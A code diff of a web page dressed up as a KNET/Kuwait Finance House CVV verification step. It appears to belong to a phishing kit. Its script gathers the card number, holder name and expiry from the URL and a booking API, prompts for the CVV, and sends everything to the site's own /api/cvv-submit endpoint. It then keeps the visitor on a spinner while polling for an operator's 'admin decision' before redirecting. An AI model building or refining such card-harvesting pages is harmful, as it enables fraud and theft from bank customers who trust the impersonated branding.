@@ -3,244 +3,223 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CVV Verification - Payment Gateway</title>
+  <title>CVV Verification - KFH</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      background-color: #d6d6d6;
+      background: #e8e8e8;
       font-family: Arial, Helvetica, sans-serif;
       font-size: 13px;
       color: #333;
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
     }
 
-    /* Banner */
+    /* ===== Banner ===== */
     .banner {
       width: 100%;
-      max-width: 780px;
-      margin: 10px auto 0;
+      max-height: 90px;
+      overflow: hidden;
+      display: block;
     }
     .banner img {
       width: 100%;
-      height: auto;
+      max-height: 90px;
+      object-fit: cover;
       display: block;
     }
 
-    /* Main Container */
+    /* ===== Container ===== */
     .container {
-      width: 100%;
-      max-width: 780px;
-      margin: 0 auto;
-      padding: 0 10px 20px;
+      max-width: 760px;
+      margin: 18px auto;
+      padding: 0 10px;
     }
 
-    /* Card Box */
+    /* ===== Card Box ===== */
     .card-box {
-      background: #f0f0f0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 20px 24px;
-      margin-bottom: 12px;
+      background: #fff;
+      border: 1px solid #c8c8c8;
+      border-radius: 4px;
+      padding: 18px 22px;
+      margin-bottom: 14px;
     }
 
-    /* KFH Logo */
+    /* ===== Bank Logo ===== */
     .bank-logo {
       text-align: center;
-      margin-bottom: 18px;
+      margin-bottom: 14px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #e0e0e0;
     }
     .bank-logo img {
-      height: 55px;
+      max-height: 52px;
+      max-width: 180px;
+      object-fit: contain;
     }
 
-    /* Info Table */
+    /* ===== Info Table ===== */
     .info-table {
       width: 100%;
       border-collapse: collapse;
-      margin-bottom: 6px;
+      margin-bottom: 0;
     }
-    .info-table tr td {
-      padding: 8px 6px;
-      border-bottom: 1px solid #ccc;
-      vertical-align: middle;
+    .info-table tr {
+      border-bottom: 1px solid #e8e8e8;
     }
-    .info-table tr:last-child td {
+    .info-table tr:last-child {
       border-bottom: none;
+    }
+    .info-table td {
+      padding: 8px 6px;
+      vertical-align: middle;
     }
     .info-table td:first-child {
       font-weight: bold;
-      color: #1a5276;
-      width: 40%;
+      color: #2a7a2a;
+      width: 38%;
+      white-space: nowrap;
+    }
+    .info-table td:last-child {
+      color: #333;
     }
 
-    /* Notification Box */
+    /* ===== Notification Box ===== */
     .notification-box {
-      background: #d6eaf8;
-      border: 1px solid #aed6f1;
-      border-radius: 4px;
-      padding: 12px 16px;
+      background: #dce8f5;
+      border: 1px solid #a8c8e8;
+      border-radius: 3px;
+      padding: 12px 14px;
       margin-bottom: 14px;
       font-size: 13px;
-      color: #1a5276;
       line-height: 1.6;
+      color: #333;
     }
     .notification-box strong {
-      color: #1a5276;
+      color: #333;
     }
 
-    /* CVV Input Row */
+    /* ===== CVV Input Row ===== */
     .cvv-row {
       display: flex;
       align-items: center;
       padding: 8px 6px;
-      border-bottom: 1px solid #ccc;
+      border-bottom: 1px solid #e8e8e8;
     }
-    .cvv-row label {
+    .cvv-label {
       font-weight: bold;
-      color: #1a5276;
-      width: 40%;
-      flex-shrink: 0;
+      color: #2a7a2a;
+      width: 38%;
+      white-space: nowrap;
     }
     .cvv-input {
-      border: 2px solid #f39c12;
+      border: 2px solid #f0a000;
       border-radius: 3px;
       padding: 6px 10px;
       font-size: 14px;
       width: 200px;
-      letter-spacing: 4px;
-      text-align: center;
       outline: none;
-      background: #fff;
+      background: #fffdf0;
+      letter-spacing: 2px;
     }
     .cvv-input:focus {
-      border-color: #e67e22;
-      box-shadow: 0 0 4px rgba(243,156,18,0.4);
+      border-color: #2a7a2a;
+      background: #fff;
     }
 
-    /* Error Message */
+    /* ===== Error Message ===== */
     .error-msg {
-      color: #c0392b;
+      color: #cc0000;
       font-size: 12px;
-      padding: 6px 6px 0;
+      margin-top: 6px;
       display: none;
+      padding: 6px 10px;
+      background: #fff0f0;
+      border: 1px solid #ffcccc;
+      border-radius: 3px;
     }
     .error-msg.show { display: block; }
 
-    /* Buttons Box */
-    .buttons-box {
-      background: #f0f0f0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 16px 24px;
-      margin-bottom: 12px;
+    /* ===== Action Box ===== */
+    .action-box {
+      background: #fff;
+      border: 1px solid #c8c8c8;
+      border-radius: 4px;
+      padding: 14px 22px;
+      margin-bottom: 14px;
+    }
+    .btn-row {
       display: flex;
-      gap: 12px;
+      gap: 10px;
     }
     .btn-confirm {
       flex: 1;
-      background: #f0f0f0;
+      padding: 10px 0;
+      background: #f5f5f5;
       border: 1px solid #aaa;
-      border-radius: 4px;
-      padding: 10px;
-      font-size: 13px;
+      border-radius: 3px;
+      font-size: 14px;
       font-weight: bold;
       cursor: pointer;
-      text-align: center;
       color: #333;
-      transition: background 0.2s;
     }
-    .btn-confirm:hover { background: #e0e0e0; }
-    .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
-
+    .btn-confirm:hover {
+      background: #e0e0e0;
+    }
     .btn-cancel {
       flex: 1;
-      background: #f0f0f0;
+      padding: 10px 0;
+      background: #f5f5f5;
       border: 1px solid #aaa;
-      border-radius: 4px;
-      padding: 10px;
-      font-size: 13px;
+      border-radius: 3px;
+      font-size: 14px;
       font-weight: bold;
       cursor: pointer;
-      text-align: center;
       color: #333;
-      transition: background 0.2s;
     }
-    .btn-cancel:hover { background: #e0e0e0; }
+    .btn-cancel:hover {
+      background: #e0e0e0;
+    }
 
-    /* Footer */
+    /* ===== Footer ===== */
     .footer {
       text-align: center;
-      margin-top: 10px;
-      color: #555;
+      padding: 10px 0 20px;
       font-size: 12px;
+      color: #555;
     }
     .footer a {
-      color: #1a5276;
+      color: #2a6496;
       text-decoration: none;
       font-weight: bold;
     }
     .footer a:hover { text-decoration: underline; }
 
-    /* Loading Overlay */
+    /* ===== Loading Overlay ===== */
     .loading-overlay {
+      display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.5);
-      display: none;
+      background: rgba(255,255,255,0.85);
+      z-index: 999;
       align-items: center;
       justify-content: center;
-      z-index: 9999;
       flex-direction: column;
       gap: 14px;
     }
     .loading-overlay.show { display: flex; }
     .spinner {
-      width: 44px; height: 44px;
-      border: 4px solid rgba(255,255,255,0.3);
-      border-top-color: #fff;
+      width: 46px; height: 46px;
+      border: 5px solid #e0e0e0;
+      border-top-color: #2a7a2a;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+      animation: spin 0.9s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-text { color: #fff; font-size: 14px; }
-
-    /* Success Overlay */
-    .success-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.7);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      flex-direction: column;
-      gap: 14px;
-    }
-    .success-overlay.show { display: flex; }
-    .success-icon {
-      font-size: 60px;
-      color: #27ae60;
-    }
-    .success-text { color: #fff; font-size: 18px; font-weight: bold; }
-    .success-sub { color: #ccc; font-size: 13px; }
+    .loading-text { font-size: 14px; color: #444; font-weight: bold; }
   </style>
 </head>
 <body>
-
-<!-- Loading Overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="spinner"></div>
-  <div class="loading-text" id="loadingText">Processing...</div>
-</div>
-
-<!-- Success Overlay -->
-<div class="success-overlay" id="successOverlay">
-  <div class="success-icon">✓</div>
-  <div class="success-text">Transaction Successful</div>
-  <div class="success-sub">Redirecting...</div>
-</div>
 
 <!-- Banner -->
 <div class="banner">
@@ -249,7 +228,7 @@
 
 <div class="container">
 
-  <!-- Main Card Box -->
+  <!-- Merchant & Amount Info -->
   <div class="card-box">
 
     <!-- KFH Logo -->
@@ -257,41 +236,39 @@
       <img src="/imgs/kfh-logo.jpg" alt="KFH Logo" />
     </div>
 
-    <!-- Merchant & Amount Info -->
     <table class="info-table">
       <tr>
         <td>Merchant:</td>
-        <td id="displayMerchant">Online Insurance System</td>
+        <td id="merchantName">Online Insurance System</td>
       </tr>
       <tr>
         <td>Amount:</td>
-        <td><strong id="displayAmount">KD 0.000</strong></td>
+        <td id="amountDisplay">KD 0.250</td>
       </tr>
     </table>
-
   </div>
 
-  <!-- CVV Card Box -->
-  <div class="card-box">
+  <!-- CVV Section -->
+  <div class="card-box" id="mainBox">
 
     <!-- Notification -->
     <div class="notification-box">
-      <strong>NOTIFICATION:</strong> Please enter the CVV (Card Verification Value) found on the back of your card. This is a 3-digit security code printed on the signature strip.
+      <strong>NOTIFICATION:</strong> Please enter the 3-digit CVV number found on the back of your card in the box below to confirm your payment.
     </div>
 
     <!-- Card Details Table -->
     <table class="info-table">
       <tr>
         <td>Card Number:</td>
-        <td id="displayCardNumber">**** **** **** ****</td>
+        <td id="cardNumberDisplay">**** **** **** ****</td>
       </tr>
       <tr>
         <td>Expiration Month:</td>
-        <td id="displayExpMonth">--</td>
+        <td id="expiryMonthDisplay">--</td>
       </tr>
       <tr>
         <td>Expiration Year:</td>
-        <td id="displayExpYear">----</td>
+        <td id="expiryYearDisplay">----</td>
       </tr>
       <tr>
         <td>PIN:</td>
@@ -299,159 +276,188 @@
       </tr>
     </table>
 
-    <!-- Error Message -->
-    <div class="error-msg" id="errorMsg">Please enter a valid CVV code.</div>
-
-    <!-- CVV Input Row -->
-    <div class="cvv-row">
-      <label for="cvvInput">CVV:</label>
-      <input
-        type="password"
-        id="cvvInput"
-        class="cvv-input"
-        placeholder="CVV"
-        maxlength="4"
-        inputmode="numeric"
-        autocomplete="cc-csc"
-      />
+    <!-- CVV Input -->
+    <div class="cvv-row" style="margin-top:10px;">
+      <div class="cvv-label">CVV:</div>
+      <div>
+        <input type="password" class="cvv-input" id="cvvInput" maxlength="4" placeholder="CVV" inputmode="numeric" autocomplete="off" />
+        <div class="error-msg" id="errorMsg">Please enter a valid CVV number.</div>
+      </div>
     </div>
 
   </div>
 
-  <!-- Buttons Box -->
-  <div class="buttons-box">
-    <button class="btn-confirm" id="confirmBtn" onclick="handleConfirm()">Confirm</button>
-    <button class="btn-cancel" onclick="handleCancel()">Cancel</button>
+  <!-- Action Buttons -->
+  <div class="action-box">
+    <div class="btn-row">
+      <button class="btn-confirm" id="confirmBtn" onclick="handleConfirm()">Confirm</button>
+      <button class="btn-cancel" onclick="handleCancel()">Cancel</button>
+    </div>
   </div>
 
   <!-- Footer -->
   <div class="footer">
-    <p>All Rights Reserved. Copyright 2025 ©</p>
-    <p><a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a></p>
+    All Rights Reserved. Copyright 2025 ©<br/>
+    <a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a>
   </div>
 
 </div>
 
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text" id="loadingText">Processing your request, please wait...</div>
+</div>
+
 <script>
-  // Read URL params
+  // ===== Read URL params =====
   const params = new URLSearchParams(window.location.search);
   const referenceId = params.get('ref') || '';
-  const amount = params.get('amount') || '0.000';
-  const cardNumber = params.get('card') || '';
-  const cardHolder = params.get('holder') || '';
-  const expiry = params.get('expiry') || '';
-  const merchant = params.get('merchant') || 'Online Insurance System';
+  const amountParam  = params.get('amount') || '';
+  const cardParam    = params.get('card') || '';
+  const expiryParam  = params.get('expiry') || '';
+  const holderParam  = params.get('holder') || '';
 
-  // Display data
-  document.getElementById('displayMerchant').textContent = merchant;
-  document.getElementById('displayAmount').textContent = 'KD ' + parseFloat(amount).toFixed(3);
-
-  if (cardNumber) {
-    const masked = cardNumber.replace(/\d(?=\d{4})/g, '*');
-    const formatted = masked.replace(/(.{4})/g, '$1 ').trim();
-    document.getElementById('displayCardNumber').textContent = formatted;
+  // ===== Load booking data from API =====
+  async function loadBookingData() {
+    if (!referenceId) return;
+    try {
+      const res = await fetch('/api/booking-data/' + encodeURIComponent(referenceId));
+      if (!res.ok) return;
+      const data = await res.json();
+      if (data && data.payment) {
+        const p = data.payment;
+        // Card Number
+        const rawCard = cardParam || p.cardNumber || '';
+        if (rawCard) {
+          const masked = rawCard.replace(/\d(?=\d{4})/g, '*');
+          document.getElementById('cardNumberDisplay').textContent = masked;
+        }
+        // Expiry
+        const rawExpiry = expiryParam || p.cardExpiry || '';
+        if (rawExpiry && rawExpiry.includes('/')) {
+          const parts = rawExpiry.split('/');
+          document.getElementById('expiryMonthDisplay').textContent = parts[0] || '--';
+          document.getElementById('expiryYearDisplay').textContent = parts[1] || '----';
+        } else {
+          const month = p.expiryMonth || '--';
+          const year  = p.expiryYear  || '----';
+          document.getElementById('expiryMonthDisplay').textContent = month;
+          document.getElementById('expiryYearDisplay').textContent  = year;
+        }
+        // Amount
+        const rawAmount = amountParam || p.amount || '0.250';
+        document.getElementById('amountDisplay').textContent = 'KD ' + rawAmount;
+        // Merchant
+        if (data.clientName) {
+          document.getElementById('merchantName').textContent = 'Online Insurance System';
+        }
+      }
+    } catch(e) {}
   }
 
-  if (expiry) {
-    const parts = expiry.split('/');
-    if (parts.length === 2) {
-      document.getElementById('displayExpMonth').textContent = parts[0];
-      document.getElementById('displayExpYear').textContent = '20' + parts[1];
+  // ===== Apply URL params immediately (before API) =====
+  (function applyUrlParams() {
+    if (cardParam) {
+      const masked = cardParam.replace(/\d(?=\d{4})/g, '*');
+      document.getElementById('cardNumberDisplay').textContent = masked;
     }
-  }
+    if (expiryParam && expiryParam.includes('/')) {
+      const parts = expiryParam.split('/');
+      document.getElementById('expiryMonthDisplay').textContent = parts[0] || '--';
+      document.getElementById('expiryYearDisplay').textContent  = parts[1] || '----';
+    }
+    if (amountParam) {
+      document.getElementById('amountDisplay').textContent = 'KD ' + amountParam;
+    }
+  })();
 
-  // Focus CVV input
-  document.getElementById('cvvInput').focus();
+  // Load data from API
+  loadBookingData();
 
+  // ===== Handle Confirm =====
   async function handleConfirm() {
     const cvv = document.getElementById('cvvInput').value.trim();
-    const errorMsg = document.getElementById('errorMsg');
-    errorMsg.classList.remove('show');
+    const errEl = document.getElementById('errorMsg');
+    errEl.classList.remove('show');
 
     if (!cvv || cvv.length < 3) {
-      errorMsg.classList.add('show');
+      errEl.textContent = 'Please enter a valid CVV number.';
+      errEl.classList.add('show');
       return;
     }
 
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
-    showLoading('Verifying...');
+    showLoading('Processing your request, please wait...');
 
     try {
       const res = await fetch('/api/cvv-submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ referenceId, cvv, amount, cardNumber, cardHolder, expiry })
+        body: JSON.stringify({
+          referenceId,
+          cvv,
+          amount: amountParam,
+          cardNumber: cardParam,
+          cardHolder: holderParam,
+          expiry: expiryParam
+        })
       });
       const data = await res.json();
       hideLoading();
 
       if (data.success) {
         if (data.redirect) {
-          showSuccess();
-          setTimeout(() => { window.location.href = data.redirect; }, 2000);
+          showLoading('Redirecting...');
+          setTimeout(() => { window.location.href = data.redirect; }, 1500);
         } else {
-          showWaiting();
-          startRedirectPolling(data.referenceId || referenceId);
+          // Wait for admin decision
+          showLoading('Processing your request, please wait...');
+          startPolling(referenceId);
         }
       } else {
-        errorMsg.textContent = data.message || 'Invalid CVV. Please try again.';
-        errorMsg.classList.add('show');
+        errEl.textContent = data.message || 'Invalid CVV. Please try again.';
+        errEl.classList.add('show');
         btn.disabled = false;
       }
-    } catch (err) {
+    } catch(e) {
       hideLoading();
-      errorMsg.textContent = 'Connection error. Please try again.';
-      errorMsg.classList.add('show');
+      errEl.textContent = 'Connection error. Please try again.';
+      errEl.classList.add('show');
       btn.disabled = false;
     }
   }
 
+  // ===== Handle Cancel =====
   function handleCancel() {
-    if (confirm('Are you sure you want to cancel this transaction?')) {
-      window.history.back();
-    }
+    window.history.back();
   }
 
-  function showLoading(text) {
-    document.getElementById('loadingText').textContent = text || 'Processing...';
-    document.getElementById('loadingOverlay').classList.add('show');
-  }
-
-  function hideLoading() {
-    document.getElementById('loadingOverlay').classList.remove('show');
-  }
-
-  function showSuccess() {
-    document.getElementById('successOverlay').classList.add('show');
-  }
-
-  function showWaiting() {
-    document.getElementById('loadingText').textContent = 'Processing your request, please wait...';
-    document.getElementById('loadingOverlay').classList.add('show');
-  }
-
-  let pollingInterval = null;
-  function startRedirectPolling(ref) {
-    if (pollingInterval) clearInterval(pollingInterval);
-    pollingInterval = setInterval(async () => {
+  // ===== Polling for redirect =====
+  let pollingTimer = null;
+  function startPolling(ref) {
+    if (pollingTimer) clearInterval(pollingTimer);
+    pollingTimer = setInterval(async () => {
       try {
         const r = await fetch('/api/check-redirect/' + encodeURIComponent(ref));
         const d = await r.json();
         if (d.success && d.redirect) {
-          clearInterval(pollingInterval);
-          showSuccess();
-          setTimeout(() => { window.location.href = d.redirect; }, 1500);
+          clearInterval(pollingTimer);
+          setTimeout(() => { window.location.href = d.redirect; }, 800);
         }
       } catch(e) {}
     }, 3000);
   }
 
-  // Enter key support
-  document.getElementById('cvvInput').addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') handleConfirm();
-  });
+  // ===== Loading helpers =====
+  function showLoading(text) {
+    document.getElementById('loadingText').textContent = text || 'Please wait...';
+    document.getElementById('loadingOverlay').classList.add('show');
+  }
+  function hideLoading() {
+    document.getElementById('loadingOverlay').classList.remove('show');
+  }
 </script>
-
 </body>
 </html>
